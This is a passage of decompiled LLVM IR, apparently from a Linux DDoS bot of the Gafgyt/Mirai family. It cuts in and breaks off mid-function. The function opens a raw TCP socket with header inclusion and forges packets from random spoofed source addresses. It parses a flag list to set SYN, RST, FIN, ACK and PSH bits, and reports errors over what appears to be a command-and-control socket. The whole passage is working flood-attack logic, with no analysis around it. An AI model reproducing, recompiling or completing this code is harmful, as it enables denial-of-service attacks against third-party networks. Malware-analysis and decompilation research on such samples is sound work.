  store i1 %v5_804d4ac, i1* %cf.global-to-local, align 1
  %v15_804d4ac = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v15_804d4ac, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 2, i32* %stack_var_-188, align 4
  %v4_804d4d3 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v4_804d4d3, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d4db = icmp eq i32 %v4_804d4d3, 0
  %v1_804d4df = icmp eq i1 %v4_804d4db, false
  br i1 %v1_804d4df, label %dec_label_pc_804d4fb, label %dec_label_pc_804d4e1

dec_label_pc_804d4e1:                             ; preds = %dec_label_pc_804d4a9
  %v0_804d4e1 = load i32, i32* @global_var_8062580.20, align 128
  store i32 %v0_804d4e1, i32* %eax.global-to-local, align 4
  store i32 %v0_804d4e1, i32* %stack_var_-188, align 4
  %v3_804d4f1 = call i32 @sockprintf(i32 %v0_804d4e1, i32 ptrtoint ([27 x i8]* @global_var_8058170.220 to i32))
  store i32 %v3_804d4f1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804da02

dec_label_pc_804d4fb:                             ; preds = %dec_label_pc_804d4a9
  store i32 1, i32* %stack_var_-64, align 4
  %v2_804d50a = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v4_804d4d3, i32* %eax.global-to-local, align 4
  store i32 %v4_804d4d3, i32* %stack_var_-188, align 4
  %v6_804d527 = call i32 @__GI_setsockopt(i32 %v4_804d4d3, i32 0, i32 3, i32 %v2_804d50a, i32 4)
  store i32 %v6_804d527, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804d52c = icmp slt i32 %v6_804d527, 0
  %v1_804d52e = icmp eq i1 %v2_804d52c, false
  br i1 %v1_804d52e, label %dec_label_pc_804d54a, label %dec_label_pc_804d530

dec_label_pc_804d530:                             ; preds = %dec_label_pc_804d4fb
  %v0_804d530 = load i32, i32* @global_var_8062580.20, align 128
  store i32 %v0_804d530, i32* %eax.global-to-local, align 4
  store i32 %v0_804d530, i32* %stack_var_-188, align 4
  %v3_804d540 = call i32 @sockprintf(i32 %v0_804d530, i32 ptrtoint ([33 x i8]* @global_var_805818c.221 to i32))
  store i32 %v3_804d540, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804da02

dec_label_pc_804d54a:                             ; preds = %dec_label_pc_804d4fb
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d54a = icmp eq i32 %arg4, 0
  %v1_804d54e = icmp eq i1 %v4_804d54a, false
  br i1 %v1_804d54e, label %dec_label_pc_804d559, label %dec_label_pc_804d56f

dec_label_pc_804d559:                             ; preds = %dec_label_pc_804d54a
  %v5_804d560 = sub i32 32, %arg4
  %v10_804d560 = icmp ugt i32 %arg4, 32
  store i1 %v10_804d560, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804d568 = urem i32 %v5_804d560, 32
  %v4_804d568 = icmp eq i32 %v2_804d568, 0
  br i1 %v4_804d568, label %bb90, label %bb

bb:                                               ; preds = %dec_label_pc_804d559
  %v5_804d568 = shl i32 1, %v2_804d568
  store i32 %v5_804d568, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb90

bb90:                                             ; preds = %dec_label_pc_804d559, %bb
  %v0_804d56a = phi i32 [ 1, %dec_label_pc_804d559 ], [ %v5_804d568, %bb ]
  %v1_804d56a = sub i32 0, %v0_804d56a
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804d56a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d56f

dec_label_pc_804d56f:                             ; preds = %dec_label_pc_804d54a, %bb90
  %storemerge10 = phi i32 [ %v1_804d56a, %bb90 ], [ 0, %dec_label_pc_804d54a ]
  %v1_804d572 = add i32 %arg6, 40
  %v1_804d57e = add i32 %arg6, 70
  %v2_804d581 = and i32 %v1_804d57e, -16
  %v0_804d587 = load i32, i32* @esp, align 4
  %v2_804d587 = sub i32 %v0_804d587, %v2_804d581
  %v1_804d589 = add i32 %v2_804d587, 24
  store i32 %v1_804d589, i32* %edx.global-to-local, align 4
  %v1_804d593 = add i32 %v2_804d587, 39
  %v2_804d596 = and i32 %v1_804d593, -16
  %v1_804d5ae = add i32 %v2_804d596, 20
  %v5_804d5b1 = inttoptr i32 %v1_804d5ae to i16*
  %v1_804d5b7 = add i32 %arg6, 20
  %v5_804d5b7 = icmp ugt i32 %arg6, -21
  store i1 %v5_804d5b7, i1* %cf.global-to-local, align 1
  store i32 %v1_804d5b7, i32* @ebx, align 4
  store i32 %storemerge10, i32* %eax.global-to-local, align 4
  %v2_804d5bf = inttoptr i32 %v2_804d587 to i32*
  store i32 %storemerge10, i32* %v2_804d5bf, align 4
  %v2_804d5c2 = call i32 @GetRandomIP(i32 %v1_804d572, i32 %v2_804d596)
  store i32 %v2_804d5c2, i32* %eax.global-to-local, align 4
  %v1_804d5c7 = load i32, i32* @esp, align 4
  %v2_804d5c7 = inttoptr i32 %v1_804d5c7 to i32*
  store i32 %v2_804d5c2, i32* %v2_804d5c7, align 4
  %v0_804d5ca = call i32 @htonl()
  %v3_804d5cf = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_804d5cf, i32* %edx.global-to-local, align 4
  %v0_804d5d2 = load i32, i32* @ebx, align 4
  %v1_804d5d2 = load i32, i32* @esp, align 4
  %v2_804d5d2 = add i32 %v1_804d5d2, 16
  %v3_804d5d2 = inttoptr i32 %v2_804d5d2 to i32*
  store i32 %v0_804d5d2, i32* %v3_804d5d2, align 4
  %v0_804d5d6 = load i32, i32* @esp, align 4
  %v1_804d5d6 = add i32 %v0_804d5d6, 12
  %v2_804d5d6 = inttoptr i32 %v1_804d5d6 to i32*
  store i32 6, i32* %v2_804d5d6, align 4
  %v1_804d5de = load i32, i32* @esp, align 4
  %v2_804d5de = add i32 %v1_804d5de, 8
  %v3_804d5de = inttoptr i32 %v2_804d5de to i32*
  store i32 %v0_804d5ca, i32* %v3_804d5de, align 4
  %v0_804d5e2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d5e2 = load i32, i32* @esp, align 4
  %v2_804d5e2 = add i32 %v1_804d5e2, 4
  %v3_804d5e2 = inttoptr i32 %v2_804d5e2 to i32*
  store i32 %v0_804d5e2, i32* %v3_804d5e2, align 4
  store i32 %v2_804d596, i32* %eax.global-to-local, align 4
  %v1_804d5e9 = load i32, i32* @esp, align 4
  %v2_804d5e9 = inttoptr i32 %v1_804d5e9 to i32*
  store i32 %v2_804d596, i32* %v2_804d5e9, align 4
  %v0_804d5ec = call i32 @makeIPPacket()
  store i32 %v0_804d5ec, i32* %eax.global-to-local, align 4
  %v2_804d5f1 = call i32 @rand_cmwc(i32 %v1_804d5ae)
  %v1_804d5f6 = urem i32 %v2_804d5f1, 65536
  store i32 %v1_804d5f6, i32* %edx.global-to-local, align 4
  store i32 %v1_804d5ae, i32* %eax.global-to-local, align 4
  %v1_804d5fc = trunc i32 %v2_804d5f1 to i16
  store i16 %v1_804d5fc, i16* %v5_804d5b1, align 4
  %v2_804d5ff = call i32 @rand_cmwc(i32 %v1_804d5ae)
  %v2_804d609 = add i32 %v2_804d596, 24
  %v3_804d609 = inttoptr i32 %v2_804d609 to i32*
  store i32 %v2_804d5ff, i32* %v3_804d609, align 8
  store i32 %v1_804d5ae, i32* %eax.global-to-local, align 4
  %v1_804d60f = add i32 %v2_804d596, 28
  %v2_804d60f = inttoptr i32 %v1_804d60f to i32*
  store i32 0, i32* %v2_804d60f, align 4
  store i32 %v1_804d5ae, i32* %edx.global-to-local, align 4
  %v1_804d619 = add i32 %v2_804d596, 32
  %v2_804d619 = inttoptr i32 %v1_804d619 to i8*
  %v3_804d619 = load i8, i8* %v2_804d619, align 16
  %v2_804d61d = urem i8 %v3_804d619, 16
  %v2_804d61f = or i8 %v2_804d61d, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v2_804d61f, i8* %v2_804d619, align 16
  %v4_804d624 = ptrtoint i8* %arg5 to i32
  store i32 %v4_804d624, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804d624, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80581ad.222 to i32), i32* @edi, align 4
  %v7_804d642 = call i32 @_strncmp(i8* %arg5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80581ad.222, i32 0, i32 0), i32 4)
  %v8_804d642 = urem i32 %v7_804d642, 2
  %v9_804d642 = icmp eq i32 %v8_804d642, 0
  %v0_804d644 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d644 = or i1 %v0_804d644, %v9_804d642
  %v3_804d644 = zext i1 %v2_804d644 to i32
  %v4_804d644 = load i32, i32* %edx.global-to-local, align 4
  %v5_804d644 = and i32 %v4_804d644, -256
  %v6_804d644 = or i32 %v3_804d644, %v5_804d644
  %v7_804d644 = xor i32 %v6_804d644, 1
  store i32 %v7_804d644, i32* @edx, align 4
  %v3_804d64a = and i32 %v7_804d642, -256
  %v1_804d64c = trunc i32 %v7_804d644 to i8
  %v3_804d64c = zext i1 %v0_804d644 to i8
  %v4_804d64c = sub nsw i8 %v1_804d64c, %v3_804d64c
  %v15_804d64c = icmp eq i8 %v4_804d64c, 0
  %v20_804d64c = zext i8 %v4_804d64c to i32
  %v23_804d64c = or i32 %v20_804d64c, %v3_804d64a
  store i32 %v23_804d64c, i32* @ecx, align 4
  %v2_804d650 = sext i8 %v4_804d64c to i32
  store i32 %v2_804d650, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d655 = icmp eq i1 %v15_804d64c, false
  br i1 %v1_804d655, label %dec_label_pc_804d698, label %dec_label_pc_804d657

dec_label_pc_804d657:                             ; preds = %dec_label_pc_804d56f
  store i32 %v1_804d5ae, i32* %edx.global-to-local, align 4
  %v1_804d65a = add i32 %v2_804d596, 33
  %v2_804d65a = inttoptr i32 %v1_804d65a to i8*
  %v3_804d65a = load i8, i8* %v2_804d65a, align 1
  %v2_804d65e = or i8 %v3_804d65a, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804d65e = zext i8 %v2_804d65e to i32
  store i32 %v7_804d65e, i32* %eax.global-to-local, align 4
  store i8 %v2_804d65e, i8* %v2_804d65a, align 1
  store i32 %v1_804d5ae, i32* %edx.global-to-local, align 4
  %v3_804d666 = load i8, i8* %v2_804d65a, align 1
  %v2_804d66a = or i8 %v3_804d666, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804d66a = zext i8 %v2_804d66a to i32
  store i32 %v7_804d66a, i32* %eax.global-to-local, align 4
  store i8 %v2_804d66a, i8* %v2_804d65a, align 1
  store i32 %v1_804d5ae, i32* %edx.global-to-local, align 4
  %v3_804d672 = load i8, i8* %v2_804d65a, align 1
  %v2_804d676 = or i8 %v3_804d672, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804d676 = zext i8 %v2_804d676 to i32
  store i32 %v7_804d676, i32* %eax.global-to-local, align 4
  store i8 %v2_804d676, i8* %v2_804d65a, align 1
  store i32 %v1_804d5ae, i32* %edx.global-to-local, align 4
  %v3_804d67e = load i8, i8* %v2_804d65a, align 1
  %v2_804d682 = or i8 %v3_804d67e, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804d682 = zext i8 %v2_804d682 to i32
  store i32 %v7_804d682, i32* %eax.global-to-local, align 4
  store i8 %v2_804d682, i8* %v2_804d65a, align 1
  store i32 %v1_804d5ae, i32* %edx.global-to-local, align 4
  %v3_804d68a = load i8, i8* %v2_804d65a, align 1
  %v2_804d68e = or i8 %v3_804d68a, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804d68e = zext i8 %v2_804d68e to i32
  store i32 %v7_804d68e, i32* %eax.global-to-local, align 4
  store i8 %v2_804d68e, i8* %v2_804d65a, align 1
  %v0_804d86e.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_804d86e

dec_label_pc_804d698:                             ; preds = %dec_label_pc_804d56f
  store i32 %v4_804d624, i32* @eax, align 4
  %v0_804d69b = load i32, i32* @esp, align 4
  %v1_804d69b = add i32 %v0_804d69b, 4
  %v2_804d69b = inttoptr i32 %v1_804d69b to i32*
  store i32 ptrtoint (i32* @global_var_80581b1.223 to i32), i32* %v2_804d69b, align 4
  %v0_804d6a3 = load i32, i32* @eax, align 4
  %v1_804d6a3 = load i32, i32* @esp, align 4
  %v2_804d6a3 = inttoptr i32 %v1_804d6a3 to i32*
  store i32 %v0_804d6a3, i32* %v2_804d6a3, align 4
  %v3_804d6a6 = call i32 @__GI_strtok(i32 4, i32 ptrtoint ([4 x i8]* @global_var_80581ad.222 to i32))
  store i32 %v3_804d6a6, i32* %eax.global-to-local, align 4
  %v5_804d6ab = inttoptr i32 %v3_804d6a6 to i8*
  store i8* %v5_804d6ab, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804d86417 = icmp eq i32 %v3_804d6a6, 0
  %v1_804d86824 = icmp eq i1 %v5_804d86417, false
  br i1 %v1_804d86824, label %dec_label_pc_804d6b3.lr.ph, label %dec_label_pc_804d86e

dec_label_pc_804d6b3.lr.ph:                       ; preds = %dec_label_pc_804d698
  %v1_804d824 = add i32 %v2_804d596, 33
  %v2_804d824 = inttoptr i32 %v1_804d824 to i8*
  %tmp91 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804d6b3

dec_label_pc_804d6b3:                             ; preds = %dec_label_pc_804d6b3.lr.ph, %dec_label_pc_804d84d
  %v3_804d836 = phi i8* [ %v5_804d6ab, %dec_label_pc_804d6b3.lr.ph ], [ %tmp92, %dec_label_pc_804d84d ]
  %stack_var_-160.126 = phi i32 [ %tmp40, %dec_label_pc_804d6b3.lr.ph ], [ %stack_var_-160.0, %dec_label_pc_804d84d ]
  %stack_var_-156.125 = phi i8* [ %tmp41, %dec_label_pc_804d6b3.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_804d84d ]
  %v4_804d6b3 = ptrtoint i8* %v3_804d836 to i32
  store i32 %v4_804d6b3, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804d6b3, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80581b3.224 to i32), i32* @edi, align 4
  %v7_804d6d1 = call i32 @_strncmp(i8* %v3_804d836, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80581b3.224, i32 0, i32 0), i32 4)
  %v8_804d6d1 = urem i32 %v7_804d6d1, 2
  %v9_804d6d1 = icmp eq i32 %v8_804d6d1, 0
  %v0_804d6d3 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d6d3 = or i1 %v0_804d6d3, %v9_804d6d1
  %v3_804d6d3 = zext i1 %v2_804d6d3 to i32
  %v4_804d6d3 = load i32, i32* @edx, align 4
  %v5_804d6d3 = and i32 %v4_804d6d3, -256
  %v6_804d6d3 = or i32 %v3_804d6d3, %v5_804d6d3
  %v7_804d6d3 = xor i32 %v6_804d6d3, 1
  store i32 %v7_804d6d3, i32* %edx.global-to-local, align 4
  %v3_804d6d9 = and i32 %v7_804d6d1, -256
  %v1_804d6db = trunc i32 %v7_804d6d3 to i8
  %v3_804d6db = zext i1 %v0_804d6d3 to i8
  %v4_804d6db = sub nsw i8 %v1_804d6db, %v3_804d6db
  %v15_804d6db = icmp eq i8 %v4_804d6db, 0
  %v20_804d6db = zext i8 %v4_804d6db to i32
  %v23_804d6db = or i32 %v20_804d6db, %v3_804d6d9
  store i32 %v23_804d6db, i32* @ecx, align 4
  %v2_804d6df = sext i8 %v4_804d6db to i32
  store i32 %v2_804d6df, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d6e4 = icmp eq i1 %v15_804d6db, false
  br i1 %v1_804d6e4, label %dec_label_pc_804d6f8, label %dec_label_pc_804d6e6

dec_label_pc_804d6e6:                             ; preds = %dec_label_pc_804d6b3
  store i32 %v1_804d5ae, i32* @eax, align 4
  %v3_804d6e9 = load i8, i8* %v2_804d824, align 1
  %v2_804d6ed = or i8 %v3_804d6e9, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804d6ed = zext i8 %v2_804d6ed to i32
  store i32 %v7_804d6ed, i32* @edx, align 4
  store i8 %v2_804d6ed, i8* %v2_804d824, align 1
  br label %dec_label_pc_804d84d

dec_label_pc_804d6f8:                             ; preds = %dec_label_pc_804d6b3
  store i32 %v4_804d6b3, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804d6b3, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80581b7.225 to i32), i32* @edi, align 4
  %v7_804d716 = call i32 @_strncmp(i8* %v3_804d836, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80581b7.225, i32 0, i32 0), i32 4)
  %v8_804d716 = urem i32 %v7_804d716, 2
  %v9_804d716 = icmp eq i32 %v8_804d716, 0
  %v0_804d718 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d718 = or i1 %v0_804d718, %v9_804d716
  %v3_804d718 = zext i1 %v2_804d718 to i32
  %v4_804d718 = load i32, i32* %edx.global-to-local, align 4
  %v5_804d718 = and i32 %v4_804d718, -256
  %v6_804d718 = or i32 %v3_804d718, %v5_804d718
  %v7_804d718 = xor i32 %v6_804d718, 1
  store i32 %v7_804d718, i32* %edx.global-to-local, align 4
  %v3_804d71e = and i32 %v7_804d716, -256
  %v1_804d720 = trunc i32 %v7_804d718 to i8
  %v3_804d720 = zext i1 %v0_804d718 to i8
  %v4_804d720 = sub nsw i8 %v1_804d720, %v3_804d720
  %v15_804d720 = icmp eq i8 %v4_804d720, 0
  %v20_804d720 = zext i8 %v4_804d720 to i32
  %v23_804d720 = or i32 %v20_804d720, %v3_804d71e
  store i32 %v23_804d720, i32* @ecx, align 4
  %v2_804d724 = sext i8 %v4_804d720 to i32
  store i32 %v2_804d724, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d729 = icmp eq i1 %v15_804d720, false
  br i1 %v1_804d729, label %dec_label_pc_804d73d, label %dec_label_pc_804d72b

dec_label_pc_804d72b:                             ; preds = %dec_label_pc_804d6f8
  store i32 %v1_804d5ae, i32* @eax, align 4
  %v3_804d72e = load i8, i8* %v2_804d824, align 1
  %v2_804d732 = or i8 %v3_804d72e, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804d732 = zext i8 %v2_804d732 to i32
  store i32 %v7_804d732, i32* @edx, align 4
  store i8 %v2_804d732, i8* %v2_804d824, align 1
  br label %dec_label_pc_804d84d

dec_label_pc_804d73d:                             ; preds = %dec_label_pc_804d6f8
  store i32 %v4_804d6b3, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804d6b3, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80581bb.226 to i32), i32* @edi, align 4
  %v7_804d761 = call i32 @_strncmp(i8* %v3_804d836, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80581bb.226, i32 0, i32 0), i32 4)
  %v8_804d761 = urem i32 %v7_804d761, 2
  %v9_804d761 = icmp eq i32 %v8_804d761, 0
  %v0_804d763 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d763 = or i1 %v0_804d763, %v9_804d761
  %v3_804d763 = zext i1 %v2_804d763 to i32
  %v4_804d763 = load i32, i32* %edx.global-to-local, align 4
  %v5_804d763 = and i32 %v4_804d763, -256
  %v6_804d763 = or i32 %v3_804d763, %v5_804d763
  %v7_804d763 = xor i32 %v6_804d763, 1
  store i32 %v7_804d763, i32* %edx.global-to-local, align 4
  %v3_804d769 = and i32 %v7_804d761, -256
  %v1_804d76b = trunc i32 %v7_804d763 to i8
  %v3_804d76b = zext i1 %v0_804d763 to i8
  %v4_804d76b = sub nsw i8 %v1_804d76b, %v3_804d76b
  %v15_804d76b = icmp eq i8 %v4_804d76b, 0
  %v20_804d76b = zext i8 %v4_804d76b to i32
  %v23_804d76b = or i32 %v20_804d76b, %v3_804d769
  store i32 %v23_804d76b, i32* @ecx, align 4
  %v2_804d76f = sext i8 %v4_804d76b to i32
  store i32 %v2_804d76f, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d774 = icmp eq i1 %v15_804d76b, false
  br i1 %v1_804d774, label %dec_label_pc_804d788, label %dec_label_pc_804d776

dec_label_pc_804d776:                             ; preds = %dec_label_pc_804d73d
  store i32 %v1_804d5ae, i32* @eax, align 4
  %v3_804d779 = load i8, i8* %v2_804d824, align 1
  %v2_804d77d = or i8 %v3_804d779, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804d77d = zext i8 %v2_804d77d to i32
  store i32 %v7_804d77d, i32* @edx, align 4
  store i8 %v2_804d77d, i8* %v2_804d824, align 1
  br label %dec_label_pc_804d84d

dec_label_pc_804d788:                             ; preds = %dec_label_pc_804d73d
  store i32 %v4_804d6b3, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804d6b3, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80581bf.227 to i32), i32* @edi, align 4
  %v7_804d7b8 = call i32 @_strncmp(i8* %v3_804d836, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80581bf.227, i32 0, i32 0), i32 4)
  %v8_804d7b8 = urem i32 %v7_804d7b8, 2
  %v9_804d7b8 = icmp eq i32 %v8_804d7b8, 0
  %v0_804d7ba = load i1, i1* %cf.global-to-local, align 1
  %v2_804d7ba = or i1 %v0_804d7ba, %v9_804d7b8
  %v3_804d7ba = zext i1 %v2_804d7ba to i32
  %v4_804d7ba = load i32, i32* %edx.global-to-local, align 4
  %v5_804d7ba = and i32 %v4_804d7ba, -256
  %v6_804d7ba = or i32 %v3_804d7ba, %v5_804d7ba
  %v7_804d7ba = xor i32 %v6_804d7ba, 1
  store i32 %v7_804d7ba, i32* %edx.global-to-local, align 4
  %v3_804d7c0 = and i32 %v7_804d7b8, -256
  %v1_804d7c2 = trunc i32 %v7_804d7ba to i8
  %v3_804d7c2 = zext i1 %v0_804d7ba to i8
  %v4_804d7c2 = sub nsw i8 %v1_804d7c2, %v3_804d7c2
  %v15_804d7c2 = icmp eq i8 %v4_804d7c2, 0
  %v20_804d7c2 = zext i8 %v4_804d7c2 to i32
  %v23_804d7c2 = or i32 %v20_804d7c2, %v3_804d7c0
  store i32 %v23_804d7c2, i32* @ecx, align 4
  %v2_804d7c6 = sext i8 %v4_804d7c2 to i32
  store i32 %v2_804d7c6, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d7cb = icmp eq i1 %v15_804d7c2, false
  br i1 %v1_804d7cb, label %dec_label_pc_804d7dc, label %dec_label_pc_804d7cd

dec_label_pc_804d7cd:                             ; preds = %dec_label_pc_804d788
  store i32 %v1_804d5ae, i32* @eax, align 4
  %v3_804d7d0 = load i8, i8* %v2_804d824, align 1
  %v2_804d7d4 = or i8 %v3_804d7d0, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804d7d4 = zext i8 %v2_804d7d4 to i32
  store i32 %v7_804d7d4, i32* @edx, align 4
  store i8 %v2_804d7d4, i8* %v2_804d824, align 1
  br label %dec_label_pc_804d84d

dec_label_pc_804d7dc:                             ; preds = %dec_label_pc_804d788
  store i32 %v4_804d6b3, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804d6b3, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80581c3.228 to i32), i32* @edi, align 4
  %v7_804d80c = call i32 @_strncmp(i8* %v3_804d836, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80581c3.228, i32 0, i32 0), i32 4)
  %v8_804d80c = urem i32 %v7_804d80c, 2
  %v9_804d80c = icmp eq i32 %v8_804d80c, 0
  %v0_804d80e = load i1, i1* %cf.global-to-local, align 1
  %v2_804d80e = or i1 %v0_804d80e, %v9_804d80c
  %v3_804d80e = zext i1 %v2_804d80e to i32
  %v4_804d80e = load i32, i32* %edx.global-to-local, align 4
  %v5_804d80e = and i32 %v4_804d80e, -256
  %v6_804d80e = or i32 %v3_804d80e, %v5_804d80e
  %v7_804d80e = xor i32 %v6_804d80e, 1
  store i32 %v7_804d80e, i32* %edx.global-to-local, align 4
  %v3_804d814 = and i32 %v7_804d80c, -256
  %v1_804d816 = trunc i32 %v7_804d80e to i8
  %v3_804d816 = zext i1 %v0_804d80e to i8
  %v4_804d816 = sub nsw i8 %v1_804d816, %v3_804d816
  %v15_804d816 = icmp eq i8 %v4_804d816, 0
  %v20_804d816 = zext i8 %v4_804d816 to i32
  %v23_804d816 = or i32 %v20_804d816, %v3_804d814
  store i32 %v23_804d816, i32* @ecx, align 4
  %v2_804d81a = sext i8 %v4_804d816 to i32
  store i32 %v2_804d81a, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d81f = icmp eq i1 %v15_804d816, false
  br i1 %v1_804d81f, label %dec_label_pc_804d830, label %dec_label_pc_804d821

dec_label_pc_804d821:                             ; preds = %dec_label_pc_804d7dc
  store i32 %v1_804d5ae, i32* @eax, align 4
  %v3_804d824 = load i8, i8* %v2_804d824, align 1
  %v2_804d828 = or i8 %v3_804d824, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804d828 = zext i8 %v2_804d828 to i32
  store i32 %v7_804d828, i32* @edx, align 4
  store i8 %v2_804d828, i8* %v2_804d824, align 1
  br label %dec_label_pc_804d84d

dec_label_pc_804d830:                             ; preds = %dec_label_pc_804d7dc
  %v0_804d830 = load i32, i32* @global_var_8062580.20, align 128
  store i32 %v0_804d830, i32* %edx.global-to-local, align 4
  store i32 %v4_804d6b3, i32* %eax.global-to-local, align 4
  %v1_804d839 = load i32, i32* @esp, align 4
  %v2_804d839 = add i32 %v1_804d839, 8
  %v3_804d839 = inttoptr i32 %v2_804d839 to i32*
  store i32 %v4_804d6b3, i32* %v3_804d839, align 4
  %v0_804d83d = load i32, i32* @esp, align 4
  %v1_804d83d = add i32 %v0_804d83d, 4
  %v2_804d83d = inttoptr i32 %v1_804d83d to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_80581c7.229 to i32), i32* %v2_804d83d, align 4
  %v0_804d845 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d845 = load i32, i32* @esp, align 4
  %v2_804d845 = inttoptr i32 %v1_804d845 to i32*
  store i32 %v0_804d845, i32* %v2_804d845, align 4
  %v3_804d848 = call i32 @sockprintf(i32 4, i32 ptrtoint ([4 x i8]* @global_var_80581c3.228 to i32))
  store i32 %v3_804d848, i32* @eax, align 4
  br label %dec_label_pc_804d84d

dec_label_pc_804d84d:                             ; preds = %dec_label_pc_804d821, %dec_label_pc_804d7cd, %dec_label_pc_804d776, %dec_label_pc_804d72b, %dec_label_pc_804d6e6, %dec_label_pc_804d830
  %stack_var_-156.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80581c3.228, i32 0, i32 0), %dec_label_pc_804d830 ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80581c3.228, i32 0, i32 0), %dec_label_pc_804d821 ], [ %stack_var_-156.125, %dec_label_pc_804d7cd ], [ %stack_var_-156.125, %dec_label_pc_804d776 ], [ %stack_var_-156.125, %dec_label_pc_804d72b ], [ %stack_var_-156.125, %dec_label_pc_804d6e6 ]
  %stack_var_-160.0 = phi i32 [ 4, %dec_label_pc_804d830 ], [ 4, %dec_label_pc_804d821 ], [ %stack_var_-160.126, %dec_label_pc_804d7cd ], [ %stack_var_-160.126, %dec_label_pc_804d776 ], [ %stack_var_-160.126, %dec_label_pc_804d72b ], [ %stack_var_-160.126, %dec_label_pc_804d6e6 ]
  %v0_804d84d = load i32, i32* @esp, align 4
  %v1_804d84d = add i32 %v0_804d84d, 4
  %v2_804d84d = inttoptr i32 %v1_804d84d to i32*
  store i32 ptrtoint (i32* @global_var_80581b1.223 to i32), i32* %v2_804d84d, align 4
  %v0_804d855 = load i32, i32* @esp, align 4
  %v1_804d855 = inttoptr i32 %v0_804d855 to i32*
  store i32 0, i32* %v1_804d855, align 4
  %v2_804d85c = ptrtoint i8* %stack_var_-156.0 to i32
  %v3_804d85c = call i32 @__GI_strtok(i32 %stack_var_-160.0, i32 %v2_804d85c)
  store i32 %v3_804d85c, i32* %eax.global-to-local, align 4
  store i32 %v3_804d85c, i32* %tmp91, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804d864 = icmp eq i32 %v3_804d85c, 0
  %v1_804d868 = icmp eq i1 %v5_804d864, false
  %tmp92 = inttoptr i32 %v3_804d85c to i8*
  br i1 %v1_804d868, label %dec_label_pc_804d6b3, label %dec_label_pc_804d86e

dec_label_pc_804d86e:                             ; preds = %dec_label_pc_804d84d, %dec_label_pc_804d698, %dec_label_pc_804d657
  %v0_804d86e = phi i8* [ %v0_804d86e.pre, %dec_label_pc_804d657 ], [ %v5_804d6ab, %dec_label_pc_804d698 ], [ %tmp92, %dec_label_pc_804d84d ]
  %v1_804d86e = ptrtoint i8* %v0_804d86e to i32
  %v2_804d86e = call i32 @rand_cmwc(i32 %v1_804d86e)
  %v1_804d873 = urem i32 %v2_804d86e, 65536
  store i32 %v1_804d873, i32* %edx.global-to-local, align 4
  %v1_804d879 = trunc i32 %v2_804d86e to i16
  %v3_804d879 = add i32 %v2_804d596, 34
